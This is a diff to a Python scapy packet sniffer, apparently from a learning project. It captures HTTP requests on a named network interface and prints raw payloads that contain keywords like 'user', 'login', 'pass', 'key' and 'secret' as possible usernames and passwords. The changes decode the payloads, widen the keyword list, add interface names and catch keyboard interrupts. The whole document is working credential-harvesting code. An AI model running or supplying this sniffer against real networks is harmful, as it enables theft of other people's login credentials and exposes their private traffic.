@@ -19,7 +19,7 @@ def do_packet_process(packet):
     ## Checks if the packet has a HTTP Request layer
     if packet.haslayer(http.HTTPRequest):
         str_url = do_parse_url(packet)
-        print(str_url)
+        print("☑  HTTP Request: " + str_url.decode())
         str_login_info = get_login_info(packet)
         if str_login_info:
             print("☑  Possbile Username and Password: " + str_login_info)
@@ -32,12 +32,18 @@ def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
     ## Specify the Raw contents of the packet after checking
         # print(packet[scapy.Raw].load)
-        obj_load = packet[scapy.Raw].load
-        list_keywords = ["user", "login", "pass", "key", "secret"]
+        obj_load = packet[scapy.Raw].load.decode()
+        list_keywords = ["user", "name", "login", "pass", "key", "secret"]
         for str_keyword in list_keywords:
             if str_keyword in obj_load:
                 return obj_load
 
-str_interface = "Hyper-V Virtual Ethernet Adapter #2"
+str_interface = "enp0s3" # Reference: ifconfig
+str_interface = "Hyper-V Virtual Ethernet Adapter #2" # Reference: ipconfig /all => Description
 
-do_interface_sniff(str_interface)
+## Try-Catch was used to enable keyboard exception handling
+try:
+    do_interface_sniff(str_interface)
+except KeyboardInterrupt:
+    print("\n" + "☒ Detected KeyboardInterrupt... Goodbye")
+    exit()
